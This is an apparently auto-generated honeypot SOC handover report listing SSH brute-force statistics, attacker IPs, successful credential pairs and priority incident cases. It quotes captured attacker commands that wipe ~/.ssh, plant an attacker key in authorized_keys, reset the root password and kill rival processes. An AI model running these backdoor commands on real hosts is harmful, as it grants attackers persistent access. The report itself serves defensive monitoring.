# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-03 |
| **Generated At** | 2026-05-03T09:25:19Z |
| **Shift Time** | 09:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **194** |
| Confirmed Threats | **169** |
| False Positives Filtered | **25** (12.9%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **17** |
| High Severity Cases | **21** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **173** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **113** |
| Unique Credential Pairs | **92** |
| Unique Usernames | **43** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 23 |
| `root` | 21 |
| `345gs5662d34` | 9 |
| `admin` | 8 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 10 |
| `345gs5662d34` | 9 |
| `12345` | 3 |
| `123` | 3 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 10 |
| `345gs5662d34` | `345gs5662d34` | 9 |
| `git` | `12345` | 2 |
| `testuser` | `testuser123456` | 2 |
| `root` | `server1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test123!@#` | `217.154.106.153` | 2026-05-03T06:49:22 |
| `root` | `3245gs5662d34` | `217.154.106.153` | 2026-05-03T06:49:26 |
| `root` | `test!@#$` | `185.16.214.226` | 2026-05-03T07:28:04 |
| `root` | `3245gs5662d34` | `185.16.214.226` | 2026-05-03T07:28:08 |
| `root` | `user` | `103.233.206.154` | 2026-05-03T07:32:46 |
| `root` | `3245gs5662d34` | `103.233.206.154` | 2026-05-03T07:32:51 |
| `root` | `server1234` | `101.126.64.76` | 2026-05-03T07:35:13 |
| `root` | `admin111222` | `185.16.214.226` | 2026-05-03T07:36:38 |
| `root` | `thisisatest` | `185.16.214.226` | 2026-05-03T07:37:57 |
| `root` | `server1234` | `185.16.214.226` | 2026-05-03T07:40:46 |
| `root` | `sqlserver123` | `103.233.206.154` | 2026-05-03T08:01:12 |
| `root` | `admin123!` | `103.233.206.154` | 2026-05-03T08:26:06 |
| `root` | `admin!1234` | `103.233.206.154` | 2026-05-03T08:29:15 |
| `root` | `hadoop123` | `103.233.206.154` | 2026-05-03T08:35:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **194** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 158 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 126 | 5 |
| `af8223ac9914...` | libssh-based | 32 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 126 | 5 | Modern SSH client |
| `af8223ac9914...` | libssh | 32 | 2 | libssh-based |
| `95420f9d932d...` | Go SSH scanner | 3 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:QI7aRJlez21h"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.64.76`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.233.206.154`, `185.16.214.226`, `217.154.106.153`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **28** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS264628` | CORPORACION FIBEX TELECOM, C.A. | 2 | HIGH |
| `AS56046` | China Mobile communications corporation | 2 | HIGH |
| `AS57044` | JSC ER-Telecom Holding | 1 | LOW |
| `AS6866` | Cyprus Telecommunications Authority | 1 | HIGH |
| `AS328856` | VIJIJI CONNECT LIMITED | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS28649` | Desktop Sigmanet Comunicação Multimídia SA | 1 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (21)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7f78ee0c8a5b

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-05-03 06:49 |
| **Last Seen** | 2026-05-03 06:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 06:49:21` | `cowrie.session.connect` |
| `2026-05-03 06:49:21` | `cowrie.client.version` |
| `2026-05-03 06:49:21` | `cowrie.client.kex` |
| `2026-05-03 06:49:22` | `cowrie.login.success` |
| `2026-05-03 06:49:22` | `cowrie.session.params` |
| `2026-05-03 06:49:22` | `cowrie.command.input` |
| `2026-05-03 06:49:22` | `cowrie.command.failed` |
| `2026-05-03 06:49:22` | `cowrie.log.closed` |
| `2026-05-03 06:49:23` | `cowrie.session.params` |
| `2026-05-03 06:49:23` | `cowrie.command.input` |
| `2026-05-03 06:49:23` | `cowrie.session.file_download` |
| `2026-05-03 06:49:23` | `cowrie.log.closed` |
| `2026-05-03 06:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f78c9ecc99

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-05-03 06:49 |
| **Last Seen** | 2026-05-03 06:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 06:49:25` | `cowrie.session.connect` |
| `2026-05-03 06:49:25` | `cowrie.client.version` |
| `2026-05-03 06:49:25` | `cowrie.client.kex` |
| `2026-05-03 06:49:26` | `cowrie.login.success` |
| `2026-05-03 06:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32381f02d18e

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:28 |
| **Last Seen** | 2026-05-03 07:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:28:03` | `cowrie.session.connect` |
| `2026-05-03 07:28:03` | `cowrie.client.version` |
| `2026-05-03 07:28:03` | `cowrie.client.kex` |
| `2026-05-03 07:28:04` | `cowrie.login.success` |
| `2026-05-03 07:28:04` | `cowrie.session.params` |
| `2026-05-03 07:28:04` | `cowrie.command.input` |
| `2026-05-03 07:28:04` | `cowrie.command.failed` |
| `2026-05-03 07:28:04` | `cowrie.log.closed` |
| `2026-05-03 07:28:05` | `cowrie.session.params` |
| `2026-05-03 07:28:05` | `cowrie.command.input` |
| `2026-05-03 07:28:05` | `cowrie.session.file_download` |
| `2026-05-03 07:28:05` | `cowrie.log.closed` |
| `2026-05-03 07:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4efd43d530a0

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:28 |
| **Last Seen** | 2026-05-03 07:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:28:07` | `cowrie.session.connect` |
| `2026-05-03 07:28:07` | `cowrie.client.version` |
| `2026-05-03 07:28:07` | `cowrie.client.kex` |
| `2026-05-03 07:28:08` | `cowrie.login.success` |
| `2026-05-03 07:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29620f58b600

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 07:32 |
| **Last Seen** | 2026-05-03 07:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:32:46` | `cowrie.session.connect` |
| `2026-05-03 07:32:46` | `cowrie.client.version` |
| `2026-05-03 07:32:46` | `cowrie.client.kex` |
| `2026-05-03 07:32:46` | `cowrie.login.success` |
| `2026-05-03 07:32:47` | `cowrie.session.params` |
| `2026-05-03 07:32:47` | `cowrie.command.input` |
| `2026-05-03 07:32:47` | `cowrie.command.failed` |
| `2026-05-03 07:32:47` | `cowrie.log.closed` |
| `2026-05-03 07:32:47` | `cowrie.session.params` |
| `2026-05-03 07:32:47` | `cowrie.command.input` |
| `2026-05-03 07:32:47` | `cowrie.session.file_download` |
| `2026-05-03 07:32:47` | `cowrie.log.closed` |
| `2026-05-03 07:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-646ce8d79395

| Field | Detail |
|---|---|
| **Source IP** | `103.233.206[.]154` |
| **First Seen** | 2026-05-03 07:32 |
| **Last Seen** | 2026-05-03 07:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:32:49` | `cowrie.session.connect` |
| `2026-05-03 07:32:49` | `cowrie.client.version` |
| `2026-05-03 07:32:51` | `cowrie.client.kex` |
| `2026-05-03 07:32:51` | `cowrie.login.success` |
| `2026-05-03 07:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.233.206[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.233.206[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0677156ac38c

| Field | Detail |
|---|---|
| **Source IP** | `101.126.64[.]76` |
| **First Seen** | 2026-05-03 07:35 |
| **Last Seen** | 2026-05-03 07:35 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:QI7aRJlez21h"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:35:12` | `cowrie.session.connect` |
| `2026-05-03 07:35:12` | `cowrie.client.version` |
| `2026-05-03 07:35:12` | `cowrie.client.kex` |
| `2026-05-03 07:35:13` | `cowrie.login.success` |
| `2026-05-03 07:35:13` | `cowrie.session.params` |
| `2026-05-03 07:35:13` | `cowrie.command.input` |
| `2026-05-03 07:35:13` | `cowrie.command.failed` |
| `2026-05-03 07:35:13` | `cowrie.log.closed` |
| `2026-05-03 07:35:14` | `cowrie.session.params` |
| `2026-05-03 07:35:14` | `cowrie.command.input` |
| `2026-05-03 07:35:14` | `cowrie.session.file_download` |
| `2026-05-03 07:35:14` | `cowrie.log.closed` |
| `2026-05-03 07:35:26` | `cowrie.session.params` |
| `2026-05-03 07:35:26` | `cowrie.command.input` |
| `2026-05-03 07:35:26` | `cowrie.log.closed` |
| `2026-05-03 07:35:26` | `cowrie.session.params` |
| `2026-05-03 07:35:26` | `cowrie.command.input` |
| `2026-05-03 07:35:27` | `cowrie.log.closed` |
| `2026-05-03 07:35:27` | `cowrie.session.params` |
| `2026-05-03 07:35:27` | `cowrie.command.input` |
| `2026-05-03 07:35:27` | `cowrie.session.file_download` |
| `2026-05-03 07:35:27` | `cowrie.log.closed` |
| `2026-05-03 07:35:28` | `cowrie.session.params` |
| `2026-05-03 07:35:28` | `cowrie.command.input` |
| `2026-05-03 07:35:28` | `cowrie.log.closed` |
| `2026-05-03 07:35:28` | `cowrie.session.params` |
| `2026-05-03 07:35:28` | `cowrie.command.input` |
| `2026-05-03 07:35:28` | `cowrie.log.closed` |
| `2026-05-03 07:35:29` | `cowrie.session.params` |
| `2026-05-03 07:35:29` | `cowrie.command.input` |
| `2026-05-03 07:35:29` | `cowrie.command.input` |
| `2026-05-03 07:35:29` | `cowrie.log.closed` |
| `2026-05-03 07:35:29` | `cowrie.session.params` |
| `2026-05-03 07:35:29` | `cowrie.command.input` |
| `2026-05-03 07:35:29` | `cowrie.log.closed` |
| `2026-05-03 07:35:30` | `cowrie.session.params` |
| `2026-05-03 07:35:30` | `cowrie.command.input` |
| `2026-05-03 07:35:30` | `cowrie.log.closed` |
| `2026-05-03 07:35:30` | `cowrie.session.params` |
| `2026-05-03 07:35:30` | `cowrie.command.input` |
| `2026-05-03 07:35:31` | `cowrie.log.closed` |
| `2026-05-03 07:35:31` | `cowrie.session.params` |
| `2026-05-03 07:35:31` | `cowrie.command.input` |
| `2026-05-03 07:35:31` | `cowrie.log.closed` |
| `2026-05-03 07:35:31` | `cowrie.session.params` |
| `2026-05-03 07:35:31` | `cowrie.command.input` |
| `2026-05-03 07:35:32` | `cowrie.log.closed` |
| `2026-05-03 07:35:32` | `cowrie.session.params` |
| `2026-05-03 07:35:32` | `cowrie.command.input` |
| `2026-05-03 07:35:32` | `cowrie.log.closed` |
| `2026-05-03 07:35:33` | `cowrie.session.params` |
| `2026-05-03 07:35:33` | `cowrie.command.input` |
| `2026-05-03 07:35:33` | `cowrie.log.closed` |
| `2026-05-03 07:35:34` | `cowrie.session.params` |
| `2026-05-03 07:35:34` | `cowrie.command.input` |
| `2026-05-03 07:35:34` | `cowrie.log.closed` |
| `2026-05-03 07:35:34` | `cowrie.session.params` |
| `2026-05-03 07:35:34` | `cowrie.command.input` |
| `2026-05-03 07:35:34` | `cowrie.log.closed` |
| `2026-05-03 07:35:35` | `cowrie.session.params` |
| `2026-05-03 07:35:35` | `cowrie.command.input` |
| `2026-05-03 07:35:35` | `cowrie.log.closed` |
| `2026-05-03 07:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.64[.]76` to AbuseIPDB if not already reported
- [ ] Block `101.126.64[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f55db88da60c

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:36 |
| **Last Seen** | 2026-05-03 07:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:36:37` | `cowrie.session.connect` |
| `2026-05-03 07:36:37` | `cowrie.client.version` |
| `2026-05-03 07:36:37` | `cowrie.client.kex` |
| `2026-05-03 07:36:38` | `cowrie.login.success` |
| `2026-05-03 07:36:38` | `cowrie.session.params` |
| `2026-05-03 07:36:38` | `cowrie.command.input` |
| `2026-05-03 07:36:38` | `cowrie.command.failed` |
| `2026-05-03 07:36:38` | `cowrie.log.closed` |
| `2026-05-03 07:36:39` | `cowrie.session.params` |
| `2026-05-03 07:36:39` | `cowrie.command.input` |
| `2026-05-03 07:36:39` | `cowrie.session.file_download` |
| `2026-05-03 07:36:39` | `cowrie.log.closed` |
| `2026-05-03 07:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6476dfdeb2c

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:36 |
| **Last Seen** | 2026-05-03 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:36:41` | `cowrie.session.connect` |
| `2026-05-03 07:36:41` | `cowrie.client.version` |
| `2026-05-03 07:36:41` | `cowrie.client.kex` |
| `2026-05-03 07:36:42` | `cowrie.login.success` |
| `2026-05-03 07:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53d49cd9fb9

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-03 07:37 |
| **Last Seen** | 2026-05-03 07:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 07:37:57` | `cowrie.session.connect` |
| `2026-05-03 07:37:57` | `cowrie.client.version` |
| `2026-05-03 07:37:57` | `cowrie.client.kex` |
| `2026-05-03 07:37:57` | `cowrie.login.success` |
| `2026-05-03 07:37:58` | `cowrie.session.params` |
| `2026-05-03 07:37:58` | `cowrie.command.input` |
| `2026-05-03 07:37:58` | `cowrie.command.failed` |
| `2026-05-03 07:37:58` | `cowrie.log.closed` |
| `2026-05-03 07:37:58` | `cowrie.session.params` |
| `2026-05-03 07:37:58` | `cowrie.command.input` |
| `2026-05-03 07:37:58` | `cowrie.session.file_download` |
